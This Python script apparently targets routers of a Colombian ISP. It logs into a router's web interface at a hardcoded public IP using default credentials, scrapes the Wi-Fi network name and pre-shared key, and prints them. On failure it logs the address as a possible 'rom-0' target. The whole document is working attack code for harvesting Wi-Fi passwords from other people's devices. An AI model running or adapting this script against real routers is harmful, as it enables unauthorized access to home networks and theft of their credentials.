import requests as rq
from netaddr import *
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
global user, password

user = "Customer"
password = "ClienteETB2006"
ip = "186.28.233.66"

try:
    req = rq.get("http://"+ip+"/basic/home_wlan.htm",auth=HTTPBasicAuth(user, password), timeout=None, verify=False)
    #req = rq.get("http://190.24.0.10/basic/wlan_simple.htm",auth=HTTPBasicAuth(user, password), timeout=None) /basic/wlan_simple.htm
    
    source = BeautifulSoup(req.content, "html.parser")
    #print source
    for red in source.find_all("input", {"name":"ESSID"}): #name="" BeetelESSID
        ssid = str(red["value"])
        for clave in source.find_all("input", {"name":"PreSharedKey"}): # BeetelPreSharedKey
            pss = str(clave["value"])
            print str(ip)
            print ssid
            print pss ##pendiente mac address
            #redes.write(str(ip)+","+ssid+","+pss+"\n")
            print "////////////////////////////////////////////////////"
except:
    redes.write(str(ip)+",posible rom-0"+"\n")